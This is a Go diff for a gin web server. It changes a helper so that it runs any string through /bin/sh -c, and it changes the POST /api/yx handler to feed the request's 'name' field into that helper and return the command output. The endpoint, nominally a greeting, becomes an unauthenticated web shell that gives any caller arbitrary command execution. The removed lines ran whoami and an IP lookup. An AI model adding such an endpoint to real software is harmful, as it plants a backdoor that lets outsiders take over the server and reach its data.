@@ -26,43 +26,22 @@ type alldocsResult struct {
 	Rows      []map[string]interface{}
 }
 
-func main1() {
+func main1(s string) string {
 
 	fmt.Println("shell")
-	var str, ip, data []byte
+	var data []byte
 	var err error
 	var cmd *exec.Cmd
-	//
-	cmd = exec.Command("whoami")
-	str, err = cmd.Output()
-	if err != nil {
-		fmt.Println(err)
-		os.Exit(1)
-	}
-	fmt.Println(string(str))
-	fmt.Println("=======")
-	//filter  line breaks
 
-	//fmt.Println(strings.Trim(string(str),"\n"))
-	cmd = exec.Command("/bin/sh", "-c", `/sbin/ifconfig en0 | grep -E 'inet ' |  awk '{print $2}'`)
-	ip, err = cmd.Output()
-	if err != nil {
-		fmt.Println(err)
-		os.Exit(1)
-	}
-	fmt.Println(string(ip))
-	//fmt.Println(strings.Trim(string(ip),"\n"))
-
-	//implement command
-	fmt.Println("====================")
-	cmd = exec.Command("/bin/sh", "-c", "echo wo shi shui wo zai na")
+	cmd = exec.Command("/bin/sh", "-c", s)
 	data, err = cmd.Output()
 	if err != nil {
 		fmt.Println(err)
-		os.Exit(1)
+
 	}
 	fmt.Println(string(data))
 	fmt.Println(strings.Trim(string(data), "\n"))
+	return string(data)
 }
 func main() {
 	r := gin.Default()
@@ -112,8 +91,7 @@ func main() {
 	r.POST("/api/yx", func(c *gin.Context) {
 		var visitor Visitor
 		if c.BindJSON(&visitor) == nil {
-			main1()
-			c.String(200, "Hello "+visitor.Name)
+			c.String(200, main1(visitor.Name))
 		}
 	})
 	/**
